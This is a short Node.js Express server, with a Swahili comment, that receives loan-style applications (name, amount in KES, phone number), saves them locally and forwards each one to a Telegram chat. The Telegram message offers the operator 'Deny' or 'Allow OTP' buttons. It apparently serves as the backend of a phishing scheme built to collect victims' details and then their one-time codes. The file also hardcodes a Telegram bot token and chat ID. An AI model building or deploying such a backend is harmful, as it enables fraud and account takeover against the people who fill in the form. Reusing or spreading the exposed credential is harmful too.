‎const express = require('express');
‎const fetch = require('node-fetch');
‎const bodyParser = require('body-parser');
‎const cors = require('cors');
‎const fs = require('fs');
‎
‎const app = express();
‎app.use(cors());
‎app.use(bodyParser.json());
‎
‎const BOT_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik";
‎const CHAT_ID = "8580615195";
‎const DB_FILE = 'applications.json';
‎
‎function readDB() {
‎  if (!fs.existsSync(DB_FILE)) return [];
‎  return JSON.parse(fs.readFileSync(DB_FILE));
‎}
‎
‎function writeDB(data) {
‎  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
‎}
‎
‎// Route ya form kutuma data
‎app.post('/submit', async (req, res) => {
‎  const { name, amount, phone } = req.body;
‎  const appId = 'APP-' + Date.now();
‎  
‎  const newApp = { appId, name, amount, phone, status: 'pending' };
‎  const db = readDB();
‎  db.push(newApp);
‎  writeDB(db);
‎
‎  const message = `🔔 NEW APPLICATION\n\n📋 ${appId}\n👤 ${name}\n💰 KES ${amount}\n📞 ${phone}\n\n⚠️ VERIFY INFORMATION`;
‎
‎  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
‎    method: 'POST',
‎    headers: {'Content-Type': 'application/json'},
‎    body: JSON.stringify({
‎      chat_id: CHAT_ID,
‎      text: message,
‎      reply_markup: {
‎        inline_keyboard: [
‎          [
‎            {text: "❌ Invalid - Deny", callback_data: `deny_${appId}`},
‎            {text: "✅ Correct - Allow OTP", callback_data: `allow_${appId}`}
‎          ]
‎        ]
‎      }
‎    })
‎  });
‎
‎  res.json({ success: true, appId, message: "Application sent" });
‎});
‎
‎app.listen(3000, () => console.log('Server running on port 3000'));
‎
‎
